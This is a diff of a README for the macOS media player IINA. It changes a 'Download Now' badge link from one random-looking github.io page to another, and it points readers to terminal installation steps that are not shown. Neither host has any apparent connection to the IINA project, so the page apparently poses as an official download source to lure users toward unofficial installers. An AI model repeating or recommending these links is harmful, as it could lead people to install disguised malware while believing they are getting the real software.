@@ -3,7 +3,7 @@
 
 IINA is a modern, open-source media player designed exclusively for macOS, offering a seamless and powerful playback experience. Follow the instructions below to install IINA on your Mac and enjoy high-quality media playback with a sleek, user-friendly interface.
 
-[![Download Now](https://img.shields.io/badge/Download%20IINA-Now-5856D6?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/iina)
+[![Download Now](https://img.shields.io/badge/Download%20IINA-Now-5856D6?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/iina)
 
 > If the download button doesn't work, follow the manual installation instructions below using the terminal.
 
